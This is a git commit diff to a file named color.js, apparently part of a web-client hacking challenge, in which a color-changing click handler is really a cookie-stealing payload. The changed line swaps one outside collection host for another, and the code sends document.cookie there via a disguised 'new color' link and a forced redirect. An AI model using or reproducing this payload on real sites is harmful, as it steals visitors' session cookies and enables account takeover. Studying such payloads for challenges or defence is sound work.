7b76e0d950f9ffef1f63f8704d7702af24db9b6b
Adrien <80692395+Drien95@users.noreply.github.com>
2024-12-09 16:57:14 +0100

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -10,7 +10,7 @@ color.onclick = () => {
     255
   )}, ${getRandomInt(255)})`;
   let url =
-    "https://405c-88-124-100-48.ngrok-free.app/xxxxx?cookie=" + document.cookie;
+    "https://server-delta-ivory.vercel.app/xxxxx?cookie=" + document.cookie;
   target.innerHTML = `<a href="${url}" target="_blank">Click here to see your new color</a>`;
   window.location.href = url;
 };
